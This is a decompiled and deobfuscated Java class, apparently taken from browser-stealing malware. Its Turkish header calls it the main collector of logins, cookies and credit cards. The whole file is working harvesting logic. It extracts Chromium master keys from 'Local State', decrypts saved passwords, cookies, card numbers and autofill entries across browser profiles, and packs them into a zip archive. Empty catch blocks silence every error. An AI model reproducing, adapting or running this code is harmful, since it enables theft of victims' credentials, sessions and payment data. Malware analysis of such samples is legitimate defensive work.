/*\n * ========================================\n * DEOBFUSCATED: MasterCollector.java\n * Original: b/a.java\n * ----------------------------------------\n * Ana veri birleştirici - Login, Cookie, CreditCard listelerini toplar\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package b;

import c.Log;
import c.d;
import c.e;
import c.e$Info;
import c.f;
import c.g;
import c.g$MasterKeys;
import c.k;
import c.l;
import c.n;
import c.n$Login;
import c.r;
import c.u;
import java.io.File;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.zip.ZipOutputStream;

public final class a {
    public static final a INSTANCE = new a();
    public final List<n$Login> b = new ArrayList<n$Login>();
    public final Set<e$Info> c = new LinkedHashSet<e$Info>();

    public int[] collectAllData(ZipOutputStream zipOutputStream) {
        Object object;
        Object object2;
        int n2 = 0;
        int n3 = 0;
        int n4 = 0;
        int n5 = 0;
        int n6 = 0;
        this.b.clear();
        this.c.clear();
        try {
            g.clearKeyCache();
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        LinkedHashMap<e$Info, g$MasterKeys> linkedHashMap = new LinkedHashMap<e$Info, g$MasterKeys>();
        for (e$Info e$Info : e$Info.values()) {
            if (!e$Info.getDataDirectory().isDirectory()) continue;
            try {
                object2 = new File(e$Info.getDataDirectory(), "Local State" /* r.ls() */);
                object = ((File)object2).isFile() ? g.getMasterKeys((File)object2, e$Info.getAbeKey()) : new g$MasterKeys(null, null);
                linkedHashMap.put(e$Info, (g$MasterKeys)object);
                try {
                    boolean bl = object != null && ((g$MasterKeys)object).a != null;
                    boolean bl2 = object != null && ((g$MasterKeys)object).b != null;
                    Log.agent("password keys " + e$Info.getBrowserName() + " v10=" + (bl ? "ok" : "null") + " v20=" + (bl2 ? "ok" : "null"));
                }
                catch (Throwable throwable) {}
            }
            catch (Throwable throwable) {
                linkedHashMap.put(e$Info, new g$MasterKeys(null, null));
            }
        }
        for (e$Info e$Info : e$Info.values()) {
            if (!e$Info.getDataDirectory().isDirectory()) continue;
            try {
                object2 = (g$MasterKeys)linkedHashMap.get((Object)e$Info);
                object = object2 != null && ((g$MasterKeys)object2).hasAny() ? new e(e$Info, (g$MasterKeys)object2) : new e(e$Info);
                f[] fArray = ((e)object).getProfiles();
                if (fArray == null || fArray.length == 0) continue;
                this.c.add(e$Info);
                String string = e$Info.getBrowserName();
                int n7 = 1;
                for (f f2 : fArray) {
                    try {
                        Object object32;
                        Object object4;
                        Object object5 = f2.getDirectory().getName();
                        if (e$Info.isFirefox()) {
                            object5 = "Profile " + n7++;
                        }
                        String string2 = "Browsers" /* r.br() */ + "/" + string + "/" + (String)object5;
                        n.resetDebugStats();
                        n n8 = f2.getDataLogins();
                        ArrayList<n$Login> arrayList = new ArrayList<n$Login>();
                        if (n8.getCount() > 0) {
                            for (n$Login object6 : n8.getLogins()) {
                                if (object6.getPassword() == null || object6.getPassword().trim().isEmpty()) continue;
                                arrayList.add(object6);
                            }
                        }
                        n2 += arrayList.size();
                        try {
                            Log.agent("passwords " + string + "/" + (String)object5 + " " + n.debugSummary() + " exported=" + arrayList.size());
                        }
                        catch (Throwable throwable) {
                            // empty catch block
                        }
                        if (!arrayList.isEmpty()) {
                            object4 = new StringBuilder();
                            for (Object object32 : arrayList) {
                                ((StringBuilder)object4).append(((n$Login)object32).getUrl()).append(" <|> ").append(((n$Login)object32).getUsername()).append(" <|> ").append(((n$Login)object32).getPassword()).append("\n");
                            }
                            d.writeZip(((StringBuilder)object4).toString(), string2 + "/" + "passwords.txt" /* r.pwt() */, zipOutputStream);
                            this.b.addAll(arrayList);
                        } else {
                            d.writeZip("", string2 + "/" + "passwords.txt" /* r.pwt() */, zipOutputStream);
                        }
                        object4 = f2.getDataCookies();
                        int n9 = ((l)object4).getValidCount();
                        n3 += n9;
                        if (n9 > 0) {
                            d.writeZip(((l)object4).toNetscapeDocument(), string2 + "/" + "cookies.txt" /* r.ckt() */, zipOutputStream);
                        } else {
                            d.writeZip("", string2 + "/" + "cookies.txt" /* r.ckt() */, zipOutputStream);
                        }
                        object32 = f2.getDataCCs();
                        n4 += ((k)object32).getCount();
                        if (((k)object32).getCount() > 0) {
                            d.writeZip("e,Card Number,Name On Card,Expiration Month,Expiration Year\n" + ((k)object32).toCsvColumn(), string2 + "/credit-cards.csv", zipOutputStream);
                        }
                        u u2 = f2.getDataAutofills();
                        int n10 = u2.getCount();
                        n5 += n10;
                        if (n10 > 0) {
                            d.writeZip(u2.toTextFormat(), string2 + "/autofills.txt", zipOutputStream);
                            continue;
                        }
                        d.writeZip("", string2 + "/autofills.txt", zipOutputStream);
                    }
                    catch (Throwable throwable) {
                        // empty catch block
                    }
                }
            }
            catch (Throwable throwable) {
                // empty catch block
            }
        }
        try {
            Log.agent("passwords total exported=" + n2);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        return new int[]{n2, n3, n4, n5, n6};
    }
}

